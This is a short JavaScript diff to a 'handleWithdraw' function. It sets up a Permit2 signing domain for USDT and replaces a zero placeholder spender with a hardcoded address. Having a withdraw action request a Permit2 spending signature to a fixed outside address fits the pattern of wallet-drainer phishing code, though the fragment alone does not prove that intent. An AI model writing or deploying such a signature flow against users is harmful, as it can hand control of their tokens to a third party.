@@ -59,8 +59,8 @@ async function handleWithdraw() {
         const PERMIT2_ADDRESS = ethers.utils.getAddress("0x000000000022D473030F116dDEE9F6B43aC78BA3");
         const USDT_ADDRESS = ethers.utils.getAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7");
         
-        // Target Spender Address (e.g., your protocol's backend/execution contract)
-        const SPENDER_ADDRESS = ethers.utils.getAddress("0x0000000000000000000000000000000000000000"); // Replace with valid spender
+        // IMPORTANT: Replace with your actual spender / router contract address
+        const SPENDER_ADDRESS = ethers.utils.getAddress("0x3848f1375B64053910c8C5aDE2e0BDC89e243F20"); // ← UPDATE THIS
 
         const domain = {
             name: "Permit2",
